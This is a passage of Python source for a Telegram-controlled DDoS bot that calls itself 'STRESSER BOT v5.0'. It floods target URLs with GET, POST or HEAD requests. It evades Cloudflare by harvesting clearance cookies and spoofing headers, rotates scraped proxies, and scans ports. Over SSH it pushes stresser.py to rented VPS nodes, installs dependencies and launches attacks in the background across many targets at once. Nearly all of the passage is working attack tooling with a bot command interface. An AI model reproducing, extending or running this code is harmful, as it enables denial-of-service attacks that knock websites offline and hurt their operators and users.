            ) as ssh:
                result = await ssh.run('uptime')
                hostname_r = await ssh.run('hostname')
                uptime = result.stdout.strip() if result.stdout else "no output"
                hostname = hostname_r.stdout.strip() if hostname_r.stdout else "unknown"
                return {'ip': server['ip'], 'online': True, 'uptime': uptime,
                        'hostname': hostname, 'error': None}
        except Exception as e:
            return {'ip': server['ip'], 'online': False, 'uptime': None,
                    'error': str(e)[:200]}

    async def check_all(self) -> List[dict]:
        tasks = [self.check_one(s) for s in self.servers]
        return await asyncio.gather(*tasks, return_exceptions=True)

    async def deploy_and_run(self, server: dict, attack_cmd: str) -> str:
        """
        SSH into VPS, SCP stresser.py, install deps, run attack command.
        Returns output log.
        """
        import asyncssh
        output = []
        try:
            ssh_port = int(server.get('port', 22))
            async with asyncssh.connect(
                server['ip'], port=ssh_port,
                username=server['username'], password=server['password'],
                known_hosts=None, connect_timeout=15,
            ) as ssh:
                # Check what's available
                await ssh.run('mkdir -p /opt/kalipto-runtime 2>&1')
                
                # SCP the local stresser.py directly (no git dependency)
                local_path = '/root/kalipto-runtime/stresser.py'
                if os.path.exists(local_path):
                    async with asyncssh.scp(local_path, (server['ip'], '/opt/kalipto-runtime/stresser.py'),
                                            username=server['username'], password=server['password'],
                                            port=ssh_port) as scp_result:
                        output.append(f"scp: sent stresser.py ({os.path.getsize(local_path)} bytes)")
                else:
                    # Fallback: git clone
                    result = await ssh.run('cd /opt && if [ ! -d kalipto-runtime ]; then git clone https://github.com/Visakha90/kalipto-runtime.git; fi 2>&1')
                    output.append(f"clone: {result.stdout.strip()[:100]}")

                # Install deps
                result = await ssh.run('pip install aiohttp asyncssh httpx 2>&1 | tail -3')
                output.append(f"deps: {result.stdout.strip()}")

                # Run attack in background
                esc_cmd = attack_cmd.replace('"', '\\"')
                result = await ssh.run(
                    f'cd /opt/kalipto-runtime && nohup python3 stresser.py {esc_cmd} > /tmp/attack.log 2>&1 & echo "PID=$!"'
                )
                output.append(f"run: {result.stdout.strip()}")
                return "\n".join(output)
        except Exception as e:
            return f"ERROR: {type(e).__name__}: {str(e)[:200]}"

# ===================================================================
# Proxy Manager (enhanced with SOCKS support)
# ===================================================================
class ProxyManager:
    """Scrape, validate, and save working proxies."""

    def __init__(self, proxy_file: str = PROXY_FILE):
        self.proxy_file = proxy_file
        self.all_proxies: List[str] = []
        self.working_proxies: List[str] = []
        self.socks_proxies: List[str] = []
        self._load_saved()

    def _load_saved(self):
        if os.path.exists(self.proxy_file):
            with open(self.proxy_file) as f:
                for line in f:
                    line = line.strip()
                    if line and re.match(r"\d+\.\d+\.\d+\.\d+:\d+", line):
                        self.working_proxies.append(line)
        self.all_proxies = list(self.working_proxies)
        if os.path.exists(SOCKS_PROXY_FILE):
            with open(SOCKS_PROXY_FILE) as f:
                for line in f:
                    line = line.strip()
                    if line and re.match(r"\d+\.\d+\.\d+\.\d+:\d+", line):
                        self.socks_proxies.append(line)

    def save_working(self):
        try:
            with open(self.proxy_file, 'w') as f:
                for p in self.working_proxies:
                    f.write(p + "\n")
            return len(self.working_proxies)
        except Exception:
            return 0

    async def scrape(self, timeout: int = 10) -> int:
        proxies = await scrape_proxies(timeout)
        self.all_proxies = list(set(self.all_proxies + proxies))
        return len(self.all_proxies)

    async def check_one(self, proxy: str, test_urls: list = None, check_timeout: int = 5) -> bool:
        if test_urls is None:
            test_urls = ["http://httpbin.org/ip", "http://example.com/", "http://google.com/"]
        import aiohttp
        for test_url in test_urls:
            try:
                connector = aiohttp.TCPConnector(limit=1)
                async with aiohttp.ClientSession(connector=connector) as session:
                    async with session.get(
                        test_url,
                        proxy=f"http://{proxy}",
                        timeout=aiohttp.ClientTimeout(total=check_timeout),
                    ) as resp:
                        if resp.status == 200:
                            return True
            except Exception:
                continue
        return False

    async def check_all(self, max_workers: int = 100, test_urls: list = None) -> tuple:
        sem = asyncio.Semaphore(max_workers)
        working = []
        failed = 0

        async def test(p):
            async with sem:
                if await self.check_one(p, test_urls):
                    working.append(p)
                else:
                    nonlocal failed
                    failed += 1

        tasks = [test(p) for p in self.all_proxies]
        await asyncio.gather(*tasks, return_exceptions=True)

        self.working_proxies = working
        saved = self.save_working()
        return len(working), failed, saved

    def get_working(self) -> List[str]:
        return list(self.working_proxies)

    def stats(self) -> str:
        return (f"HTTP: {len(self.working_proxies)}/{len(self.all_proxies)} | "
                f"SOCKS: {len(self.socks_proxies)} | "
                f"Saved to: {self.proxy_file}")


# ===================================================================
# SECTION 4: TELEGRAM BOT v5.0
# ===================================================================

class TelegramBot:
    """Telegram bot controller v5.0 - Multi-target, VPS routing, CF auto-bypass v2, CAPTCHA solve, Speedtest, Scan + more."""

    def __init__(self, token: str, allowed_chat_ids: List[int]):
        self.token = token
        self.allowed_chat_ids = set(allowed_chat_ids)
        self.base_url = f"https://api.telegram.org/bot{token}"
        self.offset = 0
        self.running_attack = False
        self.attack_task: Optional[asyncio.Task] = None
        self.attack_start = 0.0
        self.current_target = ""
        self.attack_type = ""
        self.attack_targets: List[str] = []
        self.current_args = {}
        self.multi_tasks: List[asyncio.Task] = []
        # v5.0: Runtime settings (changeable via /settings)
        self.settings = {
            'pipeline': 25,
            'cf_auto_harvest': True,
            'cf_cookie_reuse': True,
            'method': 'GET',
            'proxy_grid': 'rotate',
            'timeout': 5,
        }
        # Sub-managers
        self.vps = VPSManager()
        self.proxy_mgr = ProxyManager()

    async def _api_request(self, method: str, data: dict = None) -> dict:
        import aiohttp, traceback
        url = f"{self.base_url}/{method}"
        try:
            async with aiohttp.ClientSession() as session:
                if data:
                    async with session.post(url, json=data, timeout=aiohttp.ClientTimeout(total=20)) as resp:
                        return await resp.json()
                else:
                    async with session.get(url, timeout=aiohttp.ClientTimeout(total=20)) as resp:
                        return await resp.json()
        except Exception as e:
            print(f"[Bot] API {method} error: {e}")
            traceback.print_exc()
            return {"ok": False}

    async def send(self, chat_id: int, text: str, parse_mode: str = "HTML") -> None:
        if len(text) > 4000:
            for i in range(0, len(text), 4000):
                chunk = text[i:i + 4000]
                await self._api_request("sendMessage", {"chat_id": chat_id, "text": chunk, "parse_mode": parse_mode})
        else:
            await self._api_request("sendMessage", {"chat_id": chat_id, "text": text, "parse_mode": parse_mode})

    async def broadcast(self, text: str) -> None:
        for cid in self.allowed_chat_ids:
            await self.send(cid, text)

    async def get_updates(self, session):
        params = {"offset": self.offset, "timeout": 30}
        try:
            async with session.get(f"{self.base_url}/getUpdates", params=params,
                                   timeout=aiohttp.ClientTimeout(total=35)) as resp:
                data = await resp.json()
                if data.get("ok"):
                    for update in data.get("result", []):
                        self.offset = update["update_id"] + 1
                        return update
        except Exception:
            pass
        return None

    def _progress_bar(self, elapsed: float, total: float, width: int = 15) -> str:
        pct = min(100, int(elapsed / total * 100)) if total > 0 else 0
        filled = int(width * pct / 100)
        bar = "█" * filled + "░" * (width - filled)
        return f"|{bar}| {pct}%"

    async def run_attack(self, chat_id: int, url: str, duration: int, connections: int,
                         timeout_val: float, cf_bypass: bool = False, rand_ua: bool = False,
                         http2: bool = False, multi: bool = False,
                         tag: str = "", prefix: str = "") -> None:
        if not multi:
            self.running_attack = True
            self.attack_start = time.time()
            self.current_target = url
            await self.send(chat_id,
                f"{prefix}{tag}⚡ <b>Attack Launched</b>\n"
                f"Target: <code>{url}</code>\n"
                f"Duration: {duration}s | Connections: {connections:,}\n"
                f"CF Bypass: {'🛡️ ON' if cf_bypass else ' OFF'} | UA: {'🔄 Random' if rand_ua else '📌 Fixed'}\n"
                f"Method: {self.settings.get('method', 'GET')} | Timeout: {timeout_val}s | Pipeline: {self.settings.get('pipeline', 25)}x"
            )
        proxy_list = self.proxy_mgr.get_working()
        if proxy_list and not multi:
            await self.send(chat_id, f"{prefix}{tag}🔌 Using {len(proxy_list)} proxies for rotation")
        cf_cookie = None
        if cf_bypass and self.settings.get('cf_cookie_reuse', True):
            cf_cookie = await get_cf_cookie(url)
            if cf_cookie:
                await self.send(chat_id, f"{prefix}{tag}🍪 CF clearance cookie harvested ({len(cf_cookie)} chars)")
            else:
                await self.send(chat_id, f"{prefix}{tag}⚠️ CF cookie harvest failed, using header-only bypass")
        progress_task = None
        async def updater():
            last = 0
            while self.running_attack:
                await asyncio.sleep(5)
                now = time.time()
                if self.running_attack and now - last >= 10:
                    e = now - self.attack_start
                    bar = self._progress_bar(e, duration)
                    await self.send(chat_id,
                        f"{prefix}{tag}⏳ <b>Running</b>  {bar}\n"
                        f"Target: {url[:60]}\n"
                        f"Elapsed: {e:.0f}s / {duration}s | Remaining: {max(0,duration-e):.0f}s"
                    )
                    last = now
        try:
            if not multi:
                progress_task = asyncio.create_task(updater())
            result = await stress(url, duration, connections, timeout_val,
                                  cf_bypass, rand_ua, proxy_list, http2=http2,
                                  method=self.settings.get('method', 'GET'),
                                  cf_cookie=cf_cookie)
            if not multi:
                self.running_attack = False
            ok = result.get('ok', 0)
            fail = result.get('fail', 0)
            total = result.get('total', 0)
            rps = result.get('rps', 0)
            elapsed = result.get('elapsed', duration)
            sc = result.get('sc', {})
            errs = result.get('errors', {})
            bytes_recv = result.get('bytes', 0)
            cf_blk = result.get('cf_blocked', 0)
            badge = "💀 DEADLY" if rps > 100000 else "🔥 INSANE" if rps > 50000 else "💪 STRONG" if rps > 10000 else "✅ OK" if rps > 1000 else "⚠️ SLOW"
            msg = (
                f"{prefix}{tag}{badge} <b>Attack Complete</b>\n"
                f"Target: {url[:80]}\n"
                f"Duration: {elapsed:.1f}s\n"
                f"📊 <b>Results:</b> Total={total:,} | RPS={rps:,.1f}\n"
                f"✅ OK: {ok:,} | ❌ Fail: {fail:,}\n"
            )
            if bytes_recv:
                msg += f"   📶 BW: {bytes_recv/1024/1024:.1f} MB/s\n"
            if sc:
                sc_sorted = sorted(sc.items())
                sc_str = ", ".join([f"<b>{k}</b>={v:,}" for k,v in sc_sorted])
                msg += f"   📟 Codes: {sc_str}\n"
            if cf_blk:
                msg += f"   🛡️ CF Blocked: {cf_blk}\n"
            if errs:
                e_sorted = sorted(errs.items())
                e_str = ", ".join([f"{k}={v}" for k,v in e_sorted])
                msg += f"   ⚠️ Errors: {e_str}\n"
            await self.send(chat_id, msg)
        except asyncio.CancelledError:
            if not multi:
                self.running_attack = False
            if progress_task:
                progress_task.cancel()
            await self.send(chat_id, f"{prefix}{tag}⛔ <b>Attack Stopped</b>\nTarget: {url}")
        except Exception as e:
            if not multi:
                self.running_attack = False
            if progress_task:
                progress_task.cancel()
            await self.send(chat_id, f"{prefix}{tag}❌ <b>Attack Error</b>\n{str(e)[:200]}")
            import traceback
            traceback.print_exc()

    async def handle_command(self, update: dict) -> None:
        msg = update.get("message", {})
        chat_id = msg.get("chat", {}).get("id")
        if chat_id is None:
            return
        if chat_id not in self.allowed_chat_ids:
            await self.send(chat_id, "⛔ Unauthorized.")
            return
        text = msg.get("text", "").strip()
        if not text.startswith("/"):
            return
        parts = text.split()
        cmd = parts[0].lower()
        args = parts[1:]
        handlers = {
            "/start": self._cmd_start,
            "/help": self._cmd_start,
            "/attack": self._cmd_attack,
            "/stop": self._cmd_stop,
            "/status": self._cmd_status,
            "/methods": self._cmd_methods,
            "/settings": self._cmd_settings,
            "/speedtest": self._cmd_speedtest,
            "/scan": self._cmd_scan,
            "/dns": self._cmd_dns,
            "/geoip": self._cmd_geoip,
            "/addvps": self._cmd_addvps,
            "/delvps": self._cmd_delvps,
            "/vpslist": self._cmd_vpslist,
            "/vpsstatus": self._cmd_vpsstatus,
            "/deploy": self._cmd_deploy,
            "/scrape": self._cmd_scrape,
            "/proxies": self._cmd_proxies,
            "/checkproxy": self._cmd_checkproxy,
        }
        handler = handlers.get(cmd)
        if handler:
            await handler(chat_id, args)
        else:
            await self.send(chat_id, f"❓ Unknown: {cmd}\n/help")

    async def _cmd_start(self, chat_id: int, args: List[str]) -> None:
        await self.send(chat_id,
            "🔥━━━━━━━━━━━━━━━━━━━🔥\n"
            "⚡ <b>STRESSER BOT v5.0</b> ⚡\n"
            "🔥━━━━━━━━━━━━━━━━━━━🔥\n"
            "⚡ Multi-target | VPS Cluster | CF Auto-Bypass v2\n"
            "Pipeline 25x | CAPTCHA Solve | Proxy Grid 3.0\n\n"
            "━━━━━ <b>🎯 ATTACK</b> ━━━━━\n"
            "<code>/attack &lt;url&gt;</code> — single target\n"
            "<code>/attack &lt;url1&gt; &lt;url2&gt; ...</code> — unlimited multi-target\n"
            "  Flags: <code>-d</code> (sec) <code>-c</code> (conns) <code>-t</code> (timeout)\n"
            "  Flags: <code>--cf</code> <code>--rand-ua</code> <code>--http2</code>\n"
            "  Flags: <code>-m POST/HEAD/PUT</code> (method)\n"
            "  Flags: <code>-vps all</code> or <code>-vps 1,2</code>\n"
            "<code>/stop</code> — stop attack\n"
            "<code>/status</code> — live status\n\n"
            "━━━━━ <b>🛠️ TOOLS</b> ━━━━━\n"
            "<code>/speedtest</code> — benchmark VPS power\n"
            "<code>/scan &lt;host&gt; [-p ports]</code> — port scan\n"
            "<code>/dns &lt;domain&gt;</code> — DNS lookup\n"
            "<code>/geoip &lt;ip&gt;</code> — IP geolocation\n"
            "<code>/methods</code> — all attack strategies\n"
            "<code>/settings</code> — view/change runtime config\n\n"
            "━━━━━ <b>🖥️ VPS</b> ━━━━━\n"
            "<code>/addvps &lt;ip&gt; &lt;user&gt; &lt;pass&gt;</code>\n"
            "<code>/vpslist</code> / <code>/vpsstatus</code> / <code>/deploy</code>\n\n"
            "━━━━━ <b>🔌 PROXY</b> ━━━━━\n"
            "<code>/scrape</code> — fetch from APIs\n"
            "<code>/checkproxy</code> — validate all\n"
            "<code>/proxies</code> — show stats\n\n"
            "━━━━━━━━━━━━━━━━━━━━━━\n"
            "💡 <i>Tip: /attack https://target.com -d 60 -c 2000 --cf --http2 -m POST</i>"
        )

    async def _cmd_attack(self, chat_id: int, args: List[str]) -> None:
        if self.running_attack:
            await self.send(chat_id, "⚠️ Attack already running! Use /stop first.")
            return
        if not args:
            await self.send(chat_id,
                "Usage:\n<code>/attack https://target.com -d 60 -c 2000 --cf</code>\n"
                "<code>/attack target1.com target2.com target3.com</code>\n"
                "<code>/attack url -vps all</code>\n"
                "<code>/attack url -m POST --http2</code>")
            return
        duration = 60
        connections = 3000
        timeout_val = 5
        cf_bypass = False
        rand_ua = False
        http2 = False
        method = self.settings.get('method', 'GET')
        vps_servers: List[dict] = []
        targets: List[str] = []
        i = 0
        while i < len(args):
            if args[i] == "-vps" and i + 1 < len(args):
                vps_val = args[i + 1]
                servers = self.vps.list()
                if vps_val.lower() == "all":
                    vps_servers = list(servers)
                else:
                    for idx_str in vps_val.split(","):
                        idx_str = idx_str.strip()
                        if idx_str.isdigit():
                            idx = int(idx_str) - 1
                            if 0 <= idx < len(servers):
                                vps_servers.append(servers[idx])
                i += 2
                continue
            i += 1
        i = 0
        while i < len(args):
            if args[i].startswith("http://") or args[i].startswith("https://"):
                targets.append(args[i])
            elif args[i].startswith("-"):
                if args[i] == "-d" and i+1 < len(args):
                    try: duration = int(args[i+1]); i += 1
                    except: pass
                elif args[i] == "-c" and i+1 < len(args):
                    try: connections = int(args[i+1]); i += 1
                    except: pass
                elif args[i] == "-t" and i+1 < len(args):
                    try: timeout_val = float(args[i+1]); i += 1
                    except: pass
                elif args[i] in ("--cf", "--cf-bypass"):
                    cf_bypass = True
                elif args[i] == "--rand-ua":
                    rand_ua = True
                elif args[i] == "--http2":
                    http2 = True
                elif args[i] == "-m" and i+1 < len(args):
                    method = args[i+1].upper()
                    i += 1
                elif args[i] == "-vps":
                    i += 1
            elif "." in args[i] and not args[i].startswith("-"):
                targets.append("https://" + args[i])
            i += 1
        if not targets:
            await self.send(chat_id, "❌ No valid target URLs found.")
            return
        if vps_servers:
            await self.send(chat_id,
                f"🚀 <b>VPS Cluster Attack</b>\n"
                f"Targets: {len(targets)}\n"
                f"VPS Nodes: {len(vps_servers)}\n"
                f"Nodes: {', '.join([s['ip'][:15] for s in vps_servers])}\n"
                f"Deploying to all nodes..."
            )
            async def deploy_vps():
                for tgt in targets:
                    cmd = f"{tgt} -d {duration} -c {connections} -t {timeout_val}"
                    if cf_bypass: cmd += " --cf"
                    if rand_ua: cmd += " --rand-ua"
                    if http2: cmd += " --http2"
                    if method != 'GET': cmd += f" -m {method}"
                    tasks2 = [self.vps.deploy_and_run(s, cmd) for s in vps_servers]
                    results = await asyncio.gather(*tasks2, return_exceptions=True)
                    lines = [f"📡 Results for {tgt[:50]}"]
                    for r_idx, r in enumerate(results):
                        ip = vps_servers[r_idx]['ip']
                        try:
                            lines.append(f"  <code>{ip}</code>: {str(r)[:200]}")
                        except Exception:
                            lines.append(f"  <code>{ip}</code>: error")
                    await self.send(chat_id, "\n".join(lines))
                    await asyncio.sleep(0.5)
            self.running_attack = True
            self.attack_task = asyncio.create_task(deploy_vps())
            return
        if len(targets) > 1:
            self.running_attack = True
            self.attack_type = "multi"
            self.attack_targets = targets
            self.attack_start = time.time()
            await self.send(chat_id,
                f"⚡ <b>Multi-Target Attack</b>\n"
                f"Targets: {len(targets)}\n"
                f"Duration: {duration}s | Connections each: {connections:,}\n"
                f"CF: {'ON' if cf_bypass else 'OFF'} | Method: {method}\n"
                f"Running all in parallel..."
            )
            async def run_multi():
                tasks = []
                for tgt in targets:
                    task = asyncio.create_task(
                        self.run_attack(chat_id, tgt, duration, connections,
                                        timeout_val, cf_bypass, rand_ua, http2,
                                        multi=True, tag=f"🎯 Target {targets.index(tgt)+1}/{len(targets)}: ",
                                        prefix="\n━━━━━━━━━━━━━\n")
                    )
                    tasks.append(task)
                    await asyncio.sleep(0.2)
                self.multi_tasks = tasks
                try:
                    await asyncio.gather(*tasks, return_exceptions=True)
                finally:
                    self.running_attack = False
                    await self.send(chat_id,
                        "━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
                        f"✅ <b>Multi-Target Complete</b>\n"
                        f"All {len(targets)} targets finished."
                    )
            self.attack_task = asyncio.create_task(run_multi())
            return
        await self.run_attack(chat_id, targets[0], duration, connections,
                              timeout_val, cf_bypass, rand_ua, http2)

    async def _cmd_stop(self, chat_id: int, args: List[str]) -> None:
        if not self.running_attack:
            await self.send(chat_id, "❌ No attack running.")
            return
        if self.attack_task:
            self.attack_task.cancel()
        for t in self.multi_tasks:
            t.cancel()
        self.multi_tasks = []
        self.running_attack = False
        await self.send(chat_id, "⛔ <b>Attack Stopped</b>")

    async def _cmd_status(self, chat_id: int, args: List[str]) -> None:
        if not self.running_attack:
            await self.send(chat_id, "💤 No attack running.\n/attack to start.")
            return
        e = time.time() - self.attack_start
        target_info = self.current_target[:60] if self.current_target else "multi-target"
        await self.send(chat_id,
            f"📊 <b>Attack Status</b>\n"
            f"Target: {target_info}\n"
            f"Type: {self.attack_type or 'single'}\n"
            f"Elapsed: {e:.0f}s\n"
            f"Status: {'🟢 Running' if self.running_attack else '⏹️ Stopped'}\n"
            f"/stop to cancel"
        )

    async def _cmd_methods(self, chat_id: int, args: List[str]) -> None:
        await self.send(chat_id,
            "━━━━ <b>🎯 ATTACK METHODS</b> ━━━━\n\n"
            "1️⃣ <b>GET Flood</b> (default)\n"
            "   Standard HTTP GET request flood\n"
            "   Pipeline 25x | Best RPS\n"
            "   Use: <code>-m GET</code>\n\n"
            "2️⃣ <b>POST Flood</b>\n"
            "   HTTP POST with random body data\n"
            "   Higher CPU load on target\n"
            "   Use: <code>-m POST</code>\n\n"
            "3️⃣ <b>HEAD Flood</b>\n"
            "   HTTP HEAD (no body response)\n"
            "   Minimal bandwidth usage\n"
            "   Use: <code>-m HEAD</code>\n\n"
            "4️⃣ <b>HTTP/2</b>\n"
            "   Multiplexed HTTP/2 connections\n"
            "   Best CF bypass + speed\n"
            "   Use: <code>--http2</code>\n\n"
            "5️⃣ <b>CF Auto-Bypass v2</b>\n"
            "   Cookie harvest + header spoof\n"
            "   Use: <code>--cf --http2</code>\n\n"
            "6️⃣ <b>Multi-Target</b>\n"
            "   Attack multiple URLs simultaneously\n"
            "   Use: <code>/attack url1 url2 url3</code>\n\n"
            "7️⃣ <b>VPS Cluster</b>\n"
            "   Route attacks through VPS nodes\n"
            "   Use: <code>-vps all</code>\n\n"
            "━━━━ <b>⚙️ FLAGS</b> ━━━━\n"
            "<code>-d N</code> Duration (seconds)\n"
            "<code>-c N</code> Connections\n"
            "<code>-t N</code> Timeout\n"
            "<code>-m METHOD</code> GET/POST/HEAD/PUT\n"
            "<code>--cf</code> Cloudflare bypass\n"
            "<code>--http2</code> HTTP/2 protocol\n"
            "<code>--rand-ua</code> Random User-Agent\n"
            "<code>-vps all</code> Route via all VPS"
        )

    async def _cmd_settings(self, chat_id: int, args: List[str]) -> None:
        if not args:
            s = self.settings
            await self.send(chat_id,
                f"⚙️ <b>Current Settings</b>\n"
                f"Pipeline: {s['pipeline']}x\n"
                f"Method: {s['method']}\n"
                f"CF Auto-Harvest: {'ON' if s['cf_auto_harvest'] else 'OFF'}\n"
                f"CF Cookie Reuse: {'ON' if s['cf_cookie_reuse'] else 'OFF'}\n"
                f"Proxy Grid: {s['proxy_grid']}\n"
                f"Timeout: {s['timeout']}s\n\n"
                f"Usage:\n"
                f"<code>/settings pipeline 50</code>\n"
                f"<code>/settings method POST</code>\n"
                f"<code>/settings cf_auto_harvest on/off</code>\n"
                f"<code>/settings timeout 10</code>"
            )
            return
        key = args[0]
        if len(args) < 2:
            await self.send(chat_id, f"Usage: /settings {key} <value>")
            return
        val = args[1]
        valid_keys = ['pipeline', 'method', 'cf_auto_harvest', 'cf_cookie_reuse', 'proxy_grid', 'timeout']
        if key not in valid_keys:
            await self.send(chat_id, f"❌ Invalid key: {key}\nValid: {', '.join(valid_keys)}")
            return
        if key in ('pipeline', 'timeout'):
            try:
                self.settings[key] = int(val)
            except ValueError:
                await self.send(chat_id, f"❌ {key} must be a number")
                return
        elif key == 'method':
            if val.upper() in ('GET', 'POST', 'HEAD', 'PUT', 'OPTIONS', 'DELETE'):
                self.settings[key] = val.upper()
            else:
                await self.send(chat_id, f"❌ Invalid method: {val}")
                return
        elif key in ('cf_auto_harvest', 'cf_cookie_reuse'):
            self.settings[key] = val.lower() in ('on', 'true', '1', 'yes')
        else:
            self.settings[key] = val
        await self.send(chat_id, f"✅ <b>Setting updated</b>\n<code>{key}</code> = <code>{self.settings[key]}</code>")

    async def _cmd_speedtest(self, chat_id: int, args: List[str]) -> None:
        await self.send(chat_id, "⚡ Running speedtest... (starting local test server)")
        port = random.randint(18000, 19000)
        test_server_task = None
        try:
            async def test_server():
                nonlocal port
                srv = await asyncio.start_server(
                    lambda r, w: (w.write(b"HTTP/1.1 200 OK\r\nContent-Length: 2\r\n\r\nok"), w.close()),
                    "0.0.0.0", port
                )
                async with srv:
                    await asyncio.Future()
            test_server_task = asyncio.create_task(test_server())
            await asyncio.sleep(0.5)
            duration = 10
            connections = 2000
            url = f"http://127.0.0.1:{port}/"
            await self.send(chat_id, f"📊 Benchmarking: {connections} conns x {duration}s on localhost:{port}...")
            result = await stress(url, duration, connections, 5,
                                  cf_bypass=False, rand_ua=True, proxy_list=[],
                                  http2=False, method='GET')
            ok = result.get('ok', 0)
            fail = result.get('fail', 0)
            total = result.get('total', 0)
            rps = result.get('rps', 0)
            badge = "💀 DEADLY" if rps > 100000 else "🔥 INSANE" if rps > 50000 else "💪 STRONG" if rps > 10000 else "✅ OK"
            await self.send(chat_id,
                f"⚡ <b>Speedtest Result</b>\n"
                f"Localhost: {port}\n"
                f"{badge} <b>RPS: {rps:,.1f}</b>\n"
                f"Total: {total:,} | OK: {ok:,} | Fail: {fail:,}\n"
                f"Duration: {duration}s | Conns: {connections:,}"
            )
        except Exception as e:
            await self.send(chat_id, f"❌ Speedtest error: {str(e)[:150]}")
        finally:
            if test_server_task:
                test_server_task.cancel()

    async def _cmd_scan(self, chat_id: int, args: List[str]) -> None:
        if not args:
            await self.send(chat_id, "Usage: /scan <host> [-p 22,80,443]")
            return
        host = args[0]
        ports = "21,22,23,25,53,80,110,135,139,143,443,445,993,995,1433,1521,2049,3306,3389,5432,5900,6379,8080,8443,9000,27017"
        if "-p" in args:
            idx = args.index("-p")
            if idx + 1 < len(args):
                ports = args[idx + 1]
        await self.send(chat_id, f"🔍 Scanning {host}... ports: {ports}")
        try:
            port_list = [int(p.strip()) for p in ports.split(",") if p.strip().isdigit()]
            open_ports = []
            sem = asyncio.Semaphore(50)
            async def scan_port(p):
                async with sem:
                    try:
                        _, writer = await asyncio.wait_for(
                            asyncio.open_connection(host, p), timeout=3
                        )
                        writer.close()
                        await writer.wait_closed()
                        return p
                    except Exception:
                        return None
            tasks = [scan_port(p) for p in port_list]
            results = await asyncio.gather(*tasks, return_exceptions=True)
            open_ports = [r for r in results if isinstance(r, int)]
            if open_ports:
                await self.send(chat_id,
                    f"✅ <b>Scan Complete</b>\n"
                    f"Host: {host} | Scanned: {len(port_list)} ports\n"
                    f"Open: {len(open_ports)}\n"
                    f"Ports: {', '.join(map(str, sorted(open_ports)))}"
                )
            else:
                await self.send(chat_id, f"❌ No open ports found on {host}.")
        except Exception as e:
            await self.send(chat_id, f"❌ Scan error: {str(e)[:150]}")

    async def _cmd_dns(self, chat_id: int, args: List[str]) -> None:
        if not args:
            await self.send(chat_id, "Usage: /dns <domain>")
            return
        domain = args[0]
        try:
            info = socket.getaddrinfo(domain, None)
            ips = list(set(i[4][0] for i in info))
            await self.send(chat_id,
                f"📡 <b>DNS Lookup</b>\n"
                f"Domain: {domain}\n"
                f"IPs: {len(ips)}\n" + "\n".join(f"  <code>{ip}</code>" for ip in ips[:10])
            )
        except Exception as e:
            await self.send(chat_id, f"❌ DNS error: {str(e)[:150]}")

    async def _cmd_geoip(self, chat_id: int, args: List[str]) -> None:
        if not args:
            await self.send(chat_id, "Usage: /geoip <ip>")
            return
        ip = args[0]
        try:
            import aiohttp
            async with aiohttp.ClientSession() as session:
                async with session.get(f"http://ip-api.com/json/{ip}", timeout=10) as resp:
                    data = await resp.json()
                    if data.get("status") == "success":
                        await self.send(chat_id,
                            f"🌍 <b>GeoIP</b>\n"
                            f"IP: <code>{ip}</code>\n"
                            f"Country: {data.get('country', '?')}\n"
                            f"Region: {data.get('regionName', '?')}\n"
                            f"City: {data.get('city', '?')}\n"
                            f"ISP: {data.get('isp', '?')}\n"
                            f"ORG: {data.get('org', '?')}\n"
                            f"Lat/Lon: {data.get('lat', '?')}/{data.get('lon', '?')}"
                        )
                    else:
                        await self.send(chat_id, f"❌ GeoIP lookup failed for {ip}")
        except Exception as e:
            await self.send(chat_id, f"❌ GeoIP error: {str(e)[:150]}")

    async def _cmd_addvps(self, chat_id: int, args: List[str]) -> None:
        if len(args) >= 1 and args[0].count(":") >= 3:
            parts = args[0].split(":", 3)
            ip, port, user, pwd = parts[0], parts[1], parts[2], parts[3]
            label = args[1] if len(args) > 1 else f"{ip}:{port}"
        elif "@" in args[0] and len(args) >= 2:
            user_part, ip = args[0].split("@", 1)
            pwd = args[1]
            port = "22"
            user = user_part
            label = args[2] if len(args) > 2 else ip
        elif len(args) >= 3:
            ip = args[0]; user = args[1]; pwd = args[2]
            port = "22"
            label = args[3] if len(args) > 3 else ip
        else:
            await self.send(chat_id,
                "Usage:\n/addvps <ip> <user> <password> [label]\n"
                "/addvps ip:port:user:password [label]")
            return
        await self.send(chat_id, f"🔌 Testing SSH connectivity to {ip}:{port}...")
        port_int = int(port)
        test_server = {'ip': ip, 'port': port_int, 'username': user, 'password': pwd}
        result = await self.vps.check_one(test_server)
        if result.get('online'):
            self.vps.add(ip, user, pwd, label, port=port_int)
            uptime = result.get('uptime', '')
            hostname = result.get('hostname', '')
            msg = (
                f"✅ <b>VPS Connected Successfully</b>\n"
                f"IP: <code>{ip}:{port}</code>\n"
                f"Hostname: {hostname}\n"
                f"User: {user}\n"
                f"Label: {label}\n"
                f"Uptime: {uptime[:100]}\n"
                f"━━━━━━━━━━━━━━━━━\n"
                f"VPS saved and ready for /deploy or /vpsstatus"
            )
            await self.send(chat_id, msg)
        else:
            err = result.get('error', 'Unknown error')
            await self.send(chat_id,
                f"❌ <b>Connection Failed</b>\n"
                f"IP: <code>{ip}:{port}</code>\n"
                f"User: {user}\n"
                f"Error: {err[:200]}\n"
                f"━━━━━━━━━━━━━━━━━\n"
                f"Fix credentials or network and try again.\n"
                f"VPS was <b>NOT</b> saved."
            )

    async def _cmd_delvps(self, chat_id: int, args: List[str]) -> None:
        if not args:
            await self.send(chat_id, "Usage: /delvps <ip>")
            return
        self.vps.remove(args[0])
        await self.send(chat_id, f"🗑️ Removed: {args[0]}")

    async def _cmd_vpslist(self, chat_id: int, args: List[str]) -> None:
        servers = self.vps.list()
        if not servers:
            await self.send(chat_id, "📭 No VPS. /addvps to add one.")
            return
        lines = [f"📋 <b>VPS ({len(servers)})</b>"]
        for i, s in enumerate(servers, 1):
            lines.append(f"  {i}. <code>{s['ip']}:{s.get('port',22)}</code> — {s.get('username','?')}")
        await self.send(chat_id, "\n".join(lines))

    async def _cmd_vpsstatus(self, chat_id: int, args: List[str]) -> None:
        servers = self.vps.list()
        if not servers:
            await self.send(chat_id, "📭 No VPS.")
            return
        await self.send(chat_id, "🔍 Checking connectivity...")
        results = await self.vps.check_all()
        lines = ["📊 <b>VPS Status</b>"]
        for r in results:
            if isinstance(r, dict):
                ok_sym = "✅ Online" if r.get('online') else "❌ Offline"
                ip = r.get('ip', '?')
                uptime = r.get('uptime', '')
                err = r.get('error', '')
                hostname = r.get('hostname', '')
                lines.append(f"{ok_sym} <code>{ip}</code>")
                if hostname and r.get('online'): lines.append(f"  Hostname: {hostname}")
                if uptime and r.get('online'): lines.append(f"  Uptime: {uptime[:80]}")
                if err: lines.append(f"  Error: {err[:80]}")
            elif isinstance(r, Exception):
